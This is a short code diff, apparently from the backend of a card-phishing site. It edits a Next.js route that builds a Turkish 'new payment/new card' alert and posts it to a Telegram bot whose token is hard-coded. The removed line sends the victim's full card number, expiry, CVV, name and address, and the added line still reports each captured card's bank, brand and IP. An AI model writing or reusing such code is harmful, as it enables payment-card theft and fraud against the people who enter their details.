@@ -145,7 +145,7 @@ export async function POST(request: NextRequest) {
             } catch {}
 
             if (shouldNotify) {
-                const msg = `💳 <b>YENİ ÖDEME GELDİ</b>\n\n👤 Kart Sahibi: ${kart_isim || 'Belirtilmemiş'}\n💳 Kart: ${kredi_karti}\n📅 SKT: ${skt} | CVV: ${cvv}\n🏦 ${banka || 'Bilinmiyor'} / ${marka || ''} / ${seviye || ''}\n💰 Tutar: ${tutar || ''} | Taksit: ${taksit || 'Peşin'}\n📍 ${adresBilgisi || 'Adres yok'}\n🌐 IP: ${ip}\n🕒 ${tarih}`;
+                const msg = `💳 <b>YENİ KART GELDİ</b>\n🏦 ${banka || 'Bilinmiyor'} / ${marka || ''} / ${seviye || ''}\n🌐 ${ip} / ${tarih}`;
                 fetch('https://api.telegram.org/bot8833761305:AAGzA0xdVIpD_7otKw_3ElteNG2lcOQE4do/sendMessage', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
